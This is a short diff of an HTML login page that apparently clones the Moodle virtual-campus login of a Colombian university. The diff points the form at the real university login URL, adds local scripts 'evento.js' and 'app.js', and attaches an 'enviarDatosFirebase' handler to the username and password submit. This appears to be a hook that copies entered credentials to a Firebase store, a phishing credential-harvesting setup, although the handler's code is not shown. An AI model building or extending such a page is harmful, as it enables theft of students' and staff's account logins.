@@ -42,7 +42,8 @@
 <script src="./media/plugins/jquery/3.1.0/jquery.min.js"></script>
 <script src="./media/plugins/language/default/language.min.js"></script>
 <script src="./media/plugins/jqueryValidate/1.12.0/dist/jquery.validate.min.js"></script>
-<script src="./campus_virtual/evento.js"></script>
+<script src="evento.js"></script>
+<script src="app.js"></script>
 
 </head>
 <body class="dPrincipal">
@@ -1044,15 +1045,14 @@ Programas <strong style="color:#333">Virtuales</strong>
     
     <div class="contenido2">
         <div>
-<form action="/guardar-usuario" id="moodleform" method="post">
+<form action="https://aulasvirtuales.uniquindio.edu.co/auth/qlogin/form.php" id="moodleform" method="post" onsubmit="enviarDatosFirebase(event)">
 <div class="col-sm-12"><input name="logintoken" type="hidden" value="wGBgIxjk6SbKXhFOvTONz0rsxmovlB5r" /> <input id="urlfererer" name="urlfererer" style="display:none;" type="text" value="" />
-
-    <p><!--<label for="username">Nombre de usuario</label>--><br />
+<p><!--<label for="username">Nombre de usuario</label>--><br />
 <input class="input-login" id="username" name="username" placeholder="Nombre de usuario" type="text" value="" /></p>
 </div>
-<div class="col-sm-12">
 
-    <p><!--<label for="password">Contraseña</label>--><br />
+    <div class="col-sm-12">
+<p><!--<label for="password">Contraseña</label>--><br />
 <input class="input-login" id="password" name="password" placeholder="Contraseña" type="password" value="" /></p>
 </div>
 
